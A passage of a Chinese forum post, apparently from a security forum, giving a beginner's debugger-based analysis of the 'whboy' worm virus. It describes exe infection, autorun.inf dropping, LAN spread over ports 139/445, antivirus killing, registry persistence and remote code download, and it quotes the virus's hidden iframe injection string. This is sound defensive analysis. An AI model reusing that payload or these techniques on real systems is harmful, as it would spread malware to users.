
接着会判断查找到的文件是否为正在运行的程序，如果相等则直接返回。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_EGJMAJ4Q5SR8W3R.jpg)接着其会把寻找的到的exe文件读到内存中，并且设置文件属性。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_U6HX98B8B768KMH.jpg)然后会将正在运行的病毒样本文件复制为待感染的exe文件。这样一来现在此exe文件现在就是病毒文件了。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_M89BERRUVJHYB6J.jpg)然后往下通过动态分析得：其会获得原文件得大小然后和文件名与字符`whboy`连接在一起并以1结尾，构成一段字符串。然后一次在病毒程序后追加写入原文件和上述标志信息。

得感染后得文件组成为

| 病毒文件 | 原文件 | 标志信息 |
| --- | --- | --- |
|  |  |  |

接着我们利用上述思路分析`0x00407adc`函数得出其是通过将主要将字符串`"<iframe src=55aK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3E0J5N6X3E0J5i4K6u0W2j5$3!0E0i4K6u0r3N6$3!0J5L8g2)9J5k6h3S2@1L8b7`.`. width=0 height=0></iframe>"`添加到文件末尾而感染网络文件得。

分析完第二功能函数得第一个函数后，我们接着去分析第二个函数。我们从新加载程序，并且我们直接设`eip`为第二个功能函数得第二个函数。这样便于分析，不会受到前面函数得影响。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_QXH4B2D3N3BUQXZ.jpg)`F7`进入此函数后发现设置了一个计时器，那么我们为了方便分析此计时器回调函数干了什么，我们同样先在计时器回调函数处下断点，然后在执行完此函数后直接返回到消息循环中。运行程序，发现程序会停在此计时器回调函数中。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_CXTC9GUGZMRNQEG.jpg)我们往下分析此函数，其会先在已存在得盘得根目录下寻找`setup.exe`文件与`autorun.inf`文件。然后如果没有寻找到此文件就跳转。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_PWEJSZMEZEBRQ9A.jpg)

跟着跳转后，其会把正在运行得病毒文件复制为`c:\setup.exe`。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_4R6DAP8DH52767F.jpg)![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_786EJT8NBT6D33H.jpg)

随后又创建`c:\autorun.inf`文件

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_3TY2K3PT9QPV2WJ.jpg)往文件中写入一下内容后,将`setup.exe`与`autorun.inf`得属性设为隐藏。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_5TEP9G6UCG44TEM.jpg)

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_PF7ZMPQCDPKUFFK.jpg)此函数到此就分析结束了。

紧接着我们在分析第二个功能函数得最后一个函数，同样我们重新载入程序，并且直接来到此函数处，不运行前面那几个功能函数。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_REZPZ47REEXG39C.jpg)`F7`进入此函数，发现其会创建线程，而且是循环创建10此。为了便于对此线程回调函数得分析，我们在其执行一次创建后就让其返回到消息循环中。

并在线程回调函数处下断点，运行程序将会断在此断点处。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_S57HNZ47G3G8T2S.jpg)程序停到此线程回调函数入口点后，我们进一步分析。发现此函数会通过端口`139`和端口`445`进行区域网传播。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_DNFHBKU29UJHHMA.jpg)![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_RDZZVKQM5TQH8ZZ.jpg)这样此函数就分析完了，到此为止我们把前两个功能函数已经分析完了，下面分析第三个功能函数

## 第三个函数

我们还是重新载入程序后，直接设置`eip`来到第三个功能函数处。然后我们`F7`进入函数后发现其主要功能就是设置了4个计时器。通过四个计时器回调函数来完成具体得功能。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_UVT8JXA5PKT2NBY.jpg)我们还是采用以前得思路，在其计时器回调函数处下断点后我们运行完一个计时器设置函数后直接来到消息循环处。但是我们要注意其有的计时器设置得时间周期较长，我们可以在调用时把时间周期参数该小点。

### 1. 第一个计时器回调函数

进入函数后我们发现函数调用了`0x00406f3c`函数，进入后发现是创建了一个线程。我们在线程回调函数处下断点并采用老方法来到断点处。![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_ZD2HWRPJ9JKQWFX.jpg)

来到断点处我们发现其共有3种操作，一遍历杀毒软件并关闭。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_M2XNBG8U6GBSCXW.jpg)二是设置特权

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_PUSKZ8KJP7EFAE4.jpg)三是关闭任务管理器等一些程序

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_5VT9AV7FRB2QD47.jpg)分析完线程函数后我们回到主线程继续分析其调用`RegCreatekeyExA()`---->`RegSetValueExA`---->`RegCloseKey()`来设置两个启动项，第一个是用来在开机时自动启动病毒。另一个是设置使用户无法查看隐藏文件

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_DKTBR6XY2RHKNRQ.jpg)

### 2. 第二个计时器回调函数

接着重新载入程序来到第二个计时器回调函数处。我们在调用第二个计时器设置函数时我们应把其时间周期参数该小点，改为`1000`（1s）。然后在分析运行程序。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_VNZVN2EGJTVM87P.jpg)程序来到计时器回调函数中，发现函数实际是创建了一个线程。我们还采用直接在此线程回调函数处下断点，然后我们运行程序。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_ZMMANYYBNUD4U3F.jpg)

我们运行程序后，程序会停在线程回调函数得断点处。接下来我们就可以对此线程回调函数进一步分析。我们发现其会先调用`0x40c728`函数将一段密文与`"xboy"`进行一定得运算，算法和文件自效验时用的一样。最后得到一个网址。

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_RW8G3KB4U2EN29A.jpg)接下来其会调用函数`0x40c81c`,反汇编查看发现可疑，我们`F7`进入分析。发现其实际是从刚才产生得那个网址上试图从网站读取到网页源代码并且运行代码。

### 3. 第三个计时器回调函数

当程序停在第三个即使回调函数处时，我们发现其创建了两个线程。![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_N8DCVUAE4ZAP3SA.jpg)我们反汇编查看第二个线程得回调函数发现其利用`cmd`命令删除了共享文件

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_YAFQY2KT99E8YQP.jpg)

### 4. 第四个计时器回调函数

来到第四个计时器回调函数后发现其创建了一个线程

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_VZYGDE5WHS47227.jpg)我们在线程回调函数下断点，运行程序来到回调函数处。我们发现此回调函数主要是删除一些服务和杀毒软件得启动项（瑞星了什么的）

![在这里插入图片描述](https://bbs.kanxue.com/upload/attach/202006/861998_6VA9PZ45Z2D4VM9.jpg)

# 总结

该文就是我在分析病毒时的思路，没用IDA就时想锻炼锻炼反汇编代码的能力。动态调试结合IDA会更方便分析。第一次分析病毒如有不对的地方还请路过的大牛指点。

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于  2020-6-9 12:07

被码小芹编辑

，原因：

[#病毒木马](https://bbs.kanxue.com/forum-4-1-6.htm)
